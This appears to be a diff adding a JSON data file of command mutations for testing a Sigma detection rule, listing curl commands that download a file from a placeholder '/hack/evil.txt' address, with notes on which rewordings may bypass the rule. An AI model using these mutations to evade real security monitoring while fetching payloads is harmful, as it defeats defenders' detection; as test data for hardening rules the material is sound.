@@ -1,0 +1,14 @@
+[
+  {
+    "output": "curl -o hello.txt https://12.34.56.78/hack/evil.txt",
+    "explanation": "The '-o' flag is a shorter equivalent of '--output', which is allowed by the Sigma rule. This substitution is a safe mutation technique and maintains the same behavior."
+  },
+  {
+    "output": "curl --output hello.txt \"https://12.34.56.78/hack/evil.txt\"",
+    "explanation": "Adding quotes around the URL is a safe insertion technique that does not alter the behavior of the command but may bypass detection if the rule does not account for quoted strings."
+  },
+  {
+    "output": "curl --output hello.txt https://12.34.56.78/hack/evil.txt",
+    "explanation": "This is the original command and is not a bypass. It is included for reference."
+  }
+]
